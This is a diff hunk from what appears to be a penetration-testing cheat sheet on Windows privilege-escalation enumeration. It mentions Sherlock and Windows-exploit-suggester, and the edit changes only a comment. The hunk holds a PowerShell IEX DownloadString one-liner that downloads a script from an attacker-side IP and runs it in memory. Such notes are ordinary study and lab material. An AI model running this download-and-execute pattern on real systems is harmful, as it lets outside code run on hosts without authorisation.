@@ -269,7 +269,7 @@ Windows Enumeration:
          - Exploit Suggester (Metasploit)
 - sherlock usage:
 add Find-AllVulns in the last line
--     echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2/Sherlock.ps1') | powershell -noprofile - #download & execute
+-     echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2/Sherlock.ps1') | powershell -noprofile - #download & execute any powershell script
 
 - Windows-exploit-suggester usage:
   1- run 'systeminfo' and save it into a <sysinfo.txt>
